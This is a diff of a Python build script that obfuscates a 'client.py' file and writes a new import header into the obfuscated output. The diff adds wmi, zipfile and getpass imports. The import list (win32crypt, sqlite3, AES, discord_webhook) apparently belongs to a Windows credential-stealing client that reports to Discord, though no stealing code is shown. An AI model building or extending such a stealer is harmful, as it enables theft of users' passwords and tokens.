@@ -10,6 +10,9 @@ pyImpossibleObf.obfuscate("client.py")
 print("[.] Created client.py.hashed.py .")
 txt = open("client.py.hashed.py", "r").read()
 open("client.py.hashed.py", "w+").write("""import os
+import wmi
+import zipfile
+import getpass
 from datetime import datetime, timedelta
 from os import getenv, getlogin, listdir
 from shutil import copyfile
@@ -17,7 +20,6 @@ import sqlite3
 from discord_webhook import DiscordWebhook, DiscordEmbed
 import win32crypt
 import codecs
-import win32crypt
 import shutil
 import command
 import socket
@@ -38,6 +40,7 @@ from Crypto.Cipher import AES
 from json import loads
 from regex import findall
 import platform
+from datetime import timezone, datetime, timedelta
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import time
 import codecs
